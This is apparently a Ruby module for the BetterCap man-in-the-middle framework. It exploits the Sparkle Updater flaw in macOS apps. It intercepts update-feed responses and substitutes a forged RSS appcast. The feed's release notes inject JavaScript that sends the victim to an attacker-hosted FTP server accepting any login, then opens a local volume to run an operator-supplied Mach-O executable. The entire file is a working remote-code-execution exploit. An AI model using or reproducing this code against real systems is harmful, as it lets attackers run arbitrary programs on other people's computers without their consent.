=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

require 'time'
require 'net/http'
require 'uri'
require 'tmpdir'
begin
  require 'ftpd'
rescue LoadError
  raise BetterCap::Error, "You need to install the 'ftpd' gem for this module to work."
end

# Driver class for FTPd
class Driver
  def initialize(temp_dir)
    @temp_dir = temp_dir
  end

  def authenticate(user, password)
    true
  end

  def file_system(user)
    Ftpd::DiskFileSystem.new(@temp_dir)
  end
end

# Exploits the Sparkle Updater vulnerability:
#   https://vulnsec.com/2016/osx-apps-vulnerabilities/
class OsxSparkle < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'OsxSparkle',
    'Description' => 'Exploits the Sparkle Updater vulnerability for OS X targets.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  @@dmg_url       = 'http://get.videolan.org/vlc/2.2.1/macosx/vlc-2.2.1.dmg'
  @@dmg_size      = 0
  @@filename      = nil
  @@dsa_signature = 'MCwCFFEXjGX5snB4bblwCpRb8OTvJILfAhQt7eS3WpVM4g7duEH/xfNWaSQYfw=='
  @@rel_notes     = '<h1>Changelog</h1><p>Security Fixes.</p>'\
                    '<script type="text/javascript">'\
                    ' window.location = "ftp://a:b@LOCAL_ADDRESS:2100/";'\
                    ' window.setTimeout(function(){'\
                    '   window.location = "file:///Volumes/LOCAL_ADDRESS/FILENAME";'\
                    ' }, 2000 );' \
                    '</script>'
  @@version       = '99.99.99'
  @@temp_dir      = nil

  def self.on_options(opts)
    opts.separator ""
    opts.separator "OSX Sparkle Proxy Module Options:"
    opts.separator ""

    opts.on( '--sparkle-rce-file EXECUTABLE', 'Path of the Mach-O executable file to run on remote machine.' ) do |v|
      @@filename = File.expand_path(v)
    end
  end

  def initialize
    configure_dmg!
    configure_ftpd!
  end

  def on_request( request, response )
    if is_exploitable?( request, response )
      BetterCap::Logger.info ""
      BetterCap::Logger.info "Pwning OSX Machine :".red
      BetterCap::Logger.info "  URL    : http://#{request.host}#{request.path}"
      BetterCap::Logger.info "  AGENT  : #{request.headers['User-Agent']}"
      BetterCap::Logger.info ""

      # extract application name from the user agent:
      if request.headers['User-Agent'] =~ /([^\/]+)[0-9a-z\.\/]+\s+Sparkle.+/i
        app_name = $1
      end

      response.body = '<?xml version="1.0" encoding="utf-8"?>'\
                      '<rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle"  xmlns:dc="http://purl.org/dc/elements/1.1/">'\
                      '<channel>'\
                        '<title>' + app_name + ' Changelog</title>'\
                        '<language>en</language>'\
                        '<item>'\
                        '  <title>' + app_name + ' Version ' + @@version + '</title>'\
                        '  <description><![CDATA[ ' + @@rel_notes + ' ]]></description>'\
                        '  <pubDate>' + Time.now.to_s + '</pubDate>'\
                        '  <enclosure'\
                        '      url="' + @@dmg_url + '"'\
                        '      sparkle:version="' + @@version + '"'\
                        '      length="' + @@dmg_size + '"'\
                        '      type="application/x-apple-diskimage"'\
                        '      sparkle:dsaSignature="' + @@dsa_signature + '"'\
                        '  />'\
                        '</item>'\
                      '</channel>'\
                      '</rss>'
    end
  end

  private

  def is_exploitable?(req,res)
    req.headers.has_key?('User-Agent') and \
    req.headers['User-Agent'].include?("Sparkle") and \
    res.content_type =~ /^text\/xml/ and \
    res.code == '200'
  end

  def configure_dmg!
    BetterCap::Logger.info "[#{'OSX SPARKLE'.green}] Getting '#{@@dmg_url}' file size ..."

    response = get_file_size(@@dmg_url)
    @@dmg_size = response['content-length']
  end

  def configure_ftpd!
    raise BetterCap::Error, "No --sparkle-rce-file option specified for the proxy module." if @@filename.nil?
    raise BetterCap::Error, "File '#{@@filename}' does not exist." unless File.exist?(@@filename)

    @@temp_dir = Ftpd::TempDir.make

    FileUtils.cp( @@filename, @@temp_dir )

    server           = Ftpd::FtpServer.new(Driver.new(@@temp_dir))
    server.interface = BetterCap::Context.get.iface.ip
    server.port      = 2100
    server.start

    @@rel_notes.gsub!( 'LOCAL_ADDRESS', BetterCap::Context.get.iface.ip )
    @@rel_notes.gsub!( 'FILENAME', File.basename(@@filename) )

    BetterCap::Logger.info "[#{'OSX SPARKLE'.green}] FTP server started on ftp://#{server.interface}:#{server.port}/ ..."
  end

  def get_file_size(uri_str, limit = 10)
    raise ArgumentError, 'HTTP redirect too deep' if limit == 0

    url = URI.parse(uri_str)
    response = Net::HTTP.start(url.host, url.port) { |http| http.request_head(url.path) }
    case response
    when Net::HTTPSuccess     then response
    when Net::HTTPRedirection then get_file_size( response['location'], limit - 1 )
    else
      response.error!
    end
  end
end
